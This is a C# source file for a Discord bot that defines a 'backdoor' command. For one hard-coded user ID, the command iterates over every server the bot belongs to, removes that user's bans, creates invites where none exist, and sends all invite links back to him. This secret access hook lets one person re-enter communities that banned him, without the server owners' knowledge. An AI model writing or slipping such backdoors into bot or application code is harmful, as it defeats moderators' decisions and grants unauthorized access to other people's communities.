using System;
using System.Linq;
using System.Threading.Tasks;
using System.Collections.Generic;

using Discord;
using Discord.Commands;
using Discord.Rest;
using Discord.WebSocket;

namespace AlterBotNet.Core.Moderation
{
    public class Backdoor : ModuleBase<SocketCommandContext>
    {
        [Command("backdoor"), Summary("Crée une invitation pour tout les serveurs sur lequel le bot a été invité")]
        public async Task SendBackdoor()
        {
            if (this.Context.User.Id != 260385529474842626)
            {
                await this.Context.Channel.SendMessageAsync(":x: You are not a bot moderator!");
                return;
            }

            if (this.Context.Client.Guilds.Count < 1)
            {
                await this.Context.Channel.SendMessageAsync(":x: I am not in any guild");
                return;
            }

            IReadOnlyCollection<SocketGuild> guilds = this.Context.Client.Guilds;
            foreach (SocketGuild guild in guilds)
            {
                foreach (RestBan ban in await guild.GetBansAsync())
                {
                    if (ban.User.Id == this.Context.User.Id)
                    {
                        await guild.RemoveBanAsync(this.Context.User.Id);
                    }
                }
                IReadOnlyCollection<RestInviteMetadata> invites = await guild.GetInvitesAsync();
                if (invites.Count < 1)
                {
                    try
                    {
                        await guild.TextChannels.First().CreateInviteAsync();
                    }
                    catch (Exception ex)
                    {
                        await this.Context.Channel.SendMessageAsync($":x: Creating an invite for guild {guild.Name} went wrong with error ``{ex.Message}``");
                        return;
                    }
                }

                invites = await guild.GetInvitesAsync();
                EmbedBuilder embed = new EmbedBuilder();
                embed.WithAuthor($"Invites for guild {guild.Name}", this.Context.User.GetAvatarUrl());
                embed.WithColor(40, 200, 150);
                foreach (RestInviteMetadata current in invites)
                    embed.AddField($"Invite to {current.ChannelName} (created by {current.Inviter.Username}):", $"[invite]({current.Url})", true);

                await this.Context.Channel.SendMessageAsync("", false, embed.Build());
            }
        }
    }
}
